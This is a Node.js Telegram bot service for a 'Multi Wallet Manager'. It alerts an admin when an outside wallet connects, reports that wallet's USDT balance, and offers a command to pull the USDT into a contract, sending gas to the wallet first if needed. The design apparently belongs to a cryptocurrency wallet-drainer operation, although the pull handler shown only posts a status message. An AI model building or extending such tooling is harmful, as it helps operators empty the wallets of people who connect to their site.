const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');

dotenv.config();

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = process.env.ADMIN_CHAT_ID;
        this.botToken = process.env.TELEGRAM_BOT_TOKEN;
        this.isInitialized = false;
    }

    init() {
        if (!this.botToken) {
            console.log('⚠️ Telegram bot token not found, skipping bot initialization');
            return;
        }
        
        try {
            // Create bot instance - we'll handle updates manually
            this.bot = new TelegramBot(this.botToken, { polling: false });
            
            // Set up command handlers
            this.setupCommandHandlers();
            this.isInitialized = true;
            
            console.log('✅ Telegram bot initialized (manual update mode)');
        } catch (error) {
            console.error('❌ Telegram bot initialization failed:', error.message);
        }
    }

    setupCommandHandlers() {
        if (!this.bot) return;

        // Start command
        this.bot.onText(/\/start/, (msg) => {
            console.log('Received /start command from chat:', msg.chat.id);
            this.sendWelcomeMessage(msg.chat.id);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            console.log('Received /help command from chat:', msg.chat.id);
            this.sendWelcomeMessage(msg.chat.id);
        });

        // Pull command handler
        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
            console.log('Received /pull command from chat:', msg.chat.id);
            const walletAddress = match[1];
            this.handlePullCommand(msg.chat.id, walletAddress);
        });
    }

    async sendWelcomeMessage(chatId) {
        const message = `
🤖 Welcome to Multi Wallet Manager Bot!

Available commands:
• /pull_<address> - Pull USDT from wallet
• /help - Show this help message

Security Note: Only authorized admins can execute sensitive commands.
        `;
        
        try {
            const result = await this.bot.sendMessage(chatId, message);
            console.log('Welcome message sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending welcome message to chat', chatId, ':', error.message);
        }
    }

    async sendNewWalletAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) {
            console.log('Telegram bot not ready for sending alerts');
            return;
        }
        
        const message = `
🔔 NEW WALLET CONNECTED
Address: ${walletAddress}
USDT Balance: ${balance} USDT

Actions:
• /pull_${walletAddress} - Pull USDT to contract
        `;
        
        try {
            const result = await this.bot.sendMessage(this.adminChatId, message);
            console.log('New wallet alert sent to admin chat');
            return result;
        } catch (error) {
            console.error('Error sending new wallet alert:', error.message);
        }
    }

    async handlePullCommand(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        // Validate wallet address
        if (!walletAddress || walletAddress.length !== 42) {
            return this.bot.sendMessage(chatId, '❌ Invalid wallet address');
        }
        
        const message = `
🔄 Pull Operation Initiated
Wallet: ${walletAddress}

Processing... This will:
1. Check wallet gas balance
2. Send gas if needed
3. Pull USDT to contract
4. Send confirmation
        `;
        
        return this.bot.sendMessage(chatId, message);
    }

    // Process webhook updates manually
    async processUpdate(update) {
        if (this.bot) {
            try {
                console.log('Processing Telegram update:', JSON.stringify(update, null, 2));
                await this.bot.processUpdate(update);
            } catch (error) {
                console.error('Error processing Telegram update:', error.message);
            }
        }
    }
}

module.exports = new TelegramService();
